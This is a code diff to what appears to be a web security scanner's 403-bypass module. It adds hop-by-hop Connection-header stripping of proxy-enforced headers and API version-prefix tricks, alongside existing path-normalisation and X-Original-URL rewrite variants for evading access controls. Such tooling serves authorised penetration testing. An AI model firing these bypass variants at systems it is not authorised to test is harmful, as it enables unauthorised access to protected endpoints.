@@ -15,6 +15,7 @@ budget on attempts that actually flip 403→200, not the long tail. Each variant
 
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 # The bundled default header-bypass wordlist (lives beside the scan wordlists).
@@ -99,6 +100,22 @@ _SUFFIXES = (
 # server normalises these differently before vs after the ACL check.
 _PREFIXES = ("/./", "//", "/%2e/", "/%2e%2e//", "/.;/")
 
+# Hop-by-hop stripping (RFC 7230 §6.1): a header listed in `Connection` MUST be
+# removed by a conforming intermediary before forwarding. If a front proxy
+# enforces the ACL via one of these headers, naming it in Connection strips it in
+# transit and the backend — which may allow — never sees it. (httpx sends the
+# custom Connection value verbatim, confirmed.)
+_HOP_STRIP = (
+    "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "X-Forwarded-Proto",
+    "X-Forwarded-Server", "Forwarded", "X-Original-URL", "X-Rewrite-URL",
+    "X-Forwarded", "X-ProxyUser-Ip",
+)
+
+# API version-prefix bypass: an ACL bound to `/admin` may not cover `/v1/admin`
+# (or vice-versa) when the app routes both to the same handler.
+_API_PREFIXES = ("v1", "v2", "v3", "api", "v1.0", "latest", "internal")
+_VER_SEG = re.compile(r"/(?:v\d+(?:\.\d+)?|api)(?=/)", re.I)   # a version-ish path segment to strip
+
 
 def _swapcase(p: str) -> str:
     return "/" + p.lstrip("/").swapcase()
@@ -160,6 +177,19 @@ def variants(path: str, case_insensitive: bool = False,
     # the blocked target — the backend rewrites to it behind the front-end ACL.
     for h in ("X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "Request-URI"):
         add(f"header {h}", "GET", "/", {h: p})
+
+    # --- hop-by-hop header stripping (BruteLogic) — strip a proxy-enforced header
+    # in transit by naming it in Connection, so the (permissive) backend never sees it ---
+    for h in _HOP_STRIP:
+        add(f"hop-by-hop strip {h}", "GET", p, {"Connection": f"close, {h}"})
+
+    # --- API version-prefix bypass — add a version segment the ACL may not cover,
+    # and (if the path already has one) strip it ---
+    for ver in _API_PREFIXES:
+        add(f"api-prefix /{ver}{p}", "GET", f"/{ver}{p}", {})
+    stripped = _VER_SEG.sub("", p, count=1)
+    if stripped and stripped != p:
+        add(f"api-strip {stripped}", "GET", stripped, {})
 
     # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
     # return no body and TRACE just echoes, so they'd be false bypasses). Verb
